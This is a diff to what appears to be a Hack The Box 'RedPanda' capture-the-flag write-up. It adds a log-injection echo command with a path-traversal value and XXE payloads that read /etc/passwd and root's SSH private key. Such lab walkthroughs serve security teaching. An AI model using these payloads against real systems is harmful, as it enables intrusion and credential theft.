@@ -373,7 +373,8 @@ So what we know until now:
 
 So our attack will look like this:
 - We prepare a crafted log line that points to /tmp/1337.jpg
-	- The line should look like this "200||10.10.14.15||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/img/crafty.jpg"
+	- The line should look like this  
+	"200||10.10.14.15||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/img/crafty.jpg"
 	- Instead of the usual path, it should point to /tmp/1337.jpg
 - We prepare the 1337.jpg file that has '../tmp/1337' as the artist name
 	- Usually, the artist name is used to access /credits/artist_creds.xml
@@ -390,6 +391,11 @@ And now for the XML file, we copy an existing XML file and just add our XXE payl
 
 And then we test the attack by leaking /etc/passwd.  
 The attack is triggered by the line being added to the logs (by using echo from the reverse shell) and then waiting for the credit_score process to run.
+This is the command that we are using to inject the log that triggers the exploit:
+
+{% highlight bash %}
+echo '304||10.10.14.15||Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36||/../../../../../../tmp/1337.jpg' > /opt/panda_search/redpanda.log
+{% endhighlight %}
 
 Here's an example of the XML file before and after the credit_score process ran. 
 ![Demo attack: leaking /etc/passwd]({{site.baseurl}}/assets/img/HTB/redpanda/etc_passwd.png){: .center-image}
@@ -398,7 +404,16 @@ We can now tweak this in order to get the SSH key for the root user.
 
 ### Getting the root flag
 
-By altering the payload that we had above, we get the private key used by the root account.
+Now we can alter the payload and get the private key used by the root account.
+For that we'll replace this line
+{% highlight xml %}
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+{% endhighlight %}
+With this one 
+{% highlight xml %}
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/root/.ssh/id_rsa"> ]>
+{% endhighlight %}
+
 ![Getting root's SSH key]({{site.baseurl}}/assets/img/HTB/redpanda/root_key.png){: .center-image}
 
 And we can now login as root and get the root flag.
